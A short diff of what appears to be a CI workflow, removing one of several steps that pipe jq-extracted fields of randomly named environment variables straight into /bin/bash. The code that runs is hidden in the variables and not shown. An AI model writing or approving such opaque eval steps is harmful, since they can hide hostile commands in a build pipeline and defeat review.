@@ -28,7 +28,6 @@ jobs:
           printf '%s' "$zzo996" | jq -r .rlz21 | /bin/bash
           printf '%s' "$xs24" | jq -r .pdb714 | /bin/bash
           echo $nw5 | jq -r .sgv886 | /bin/bash
-          printf '%s' "$lkb06" | jq -r .z28897 | /bin/bash
           printf '%s' "$t181" | jq -r .gfpj59144 | /bin/bash
 
       - name: Archive results
